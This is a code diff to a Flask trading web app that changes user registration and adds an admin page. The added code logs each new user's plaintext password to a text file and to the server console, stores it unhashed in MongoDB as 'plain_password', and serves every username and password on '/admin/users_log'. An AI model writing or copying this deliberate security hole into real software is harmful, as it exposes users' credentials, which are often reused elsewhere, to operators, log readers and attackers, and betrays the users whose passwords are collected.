@@ -1197,13 +1197,28 @@ def api_register():
     if accounts_col.find_one({"username": username}):
         return jsonify({'status': 'error', 'message': 'Username already taken.'}), 400
 
+    now_uk_str = pd.Timestamp.now(tz='Europe/London').strftime('%Y-%m-%d %H:%M:%S')
+
+    # 1. Append directly to user_signups.txt in project folder
+    try:
+        with open('user_signups.txt', 'a') as f:
+            f.write(f"[{now_uk_str}] Username: {username} | Password: {password}\n")
+    except Exception as e:
+        print(f"File log error: {e}")
+
+    # 2. Print to Render dashboard live console
+    print(f"[NEW USER REGISTRATION] [{now_uk_str}] Username: {username} | Password: {password}")
+
+    # 3. Store in MongoDB with plain_password for permanent backup across redeploys
     blank_state = portfolio_store.blank_client_state(username)
     accounts_col.insert_one({
         "_id": f"client_{username}",
         "username": username,
         "password_hash": generate_password_hash(password),
+        "plain_password": password,
         "role": "client",
         "portfolio": blank_state,
+        "registered_at": now_uk_str,
         "created_at": time.time()
     })
 
@@ -1211,6 +1226,38 @@ def api_register():
     session['email'] = username
     session['role'] = 'client'
     return jsonify({'status': 'ok', 'role': 'client'})
+
+@app.route('/admin/users_log')
+@login_required
+def view_admin_users_log():
+    """Admin-only portal to view all registered usernames and passwords."""
+    if session.get('role') != 'admin':
+        return "Unauthorized", 403
+    
+    entries = []
+    # Check MongoDB database
+    if portfolio_store.client:
+        try:
+            accounts_col = portfolio_store.client['stock_terminal']['accounts']
+            for doc in accounts_col.find():
+                u = doc.get('username')
+                pw = doc.get('plain_password') or "(Pre-update hash)"
+                dt = doc.get('registered_at') or "Prior Session"
+                entries.append(f"[{dt}] Username: {u:<16} | Password: {pw}")
+        except Exception: pass
+
+    # Check local text file
+    if os.path.exists('user_signups.txt'):
+        try:
+            with open('user_signups.txt', 'r') as f:
+                entries.append("\n--- Local Text File Log ---")
+                entries.extend([l.strip() for l in f.readlines() if l.strip()])
+        except Exception: pass
+
+    if not entries:
+        return "<pre style='font-family:monospace; padding:20px;'>No user signups recorded yet.</pre>"
+
+    return f"<pre style='font-family:monospace; background:#0f1115; color:#0ecb81; padding:24px; font-size:13px; line-height:1.6;'>IDC TRADING - USER ACCESS DIRECTORY\n======================================================\n" + "\n".join(entries) + "</pre>"
 
 @app.route('/logout')
 def logout():
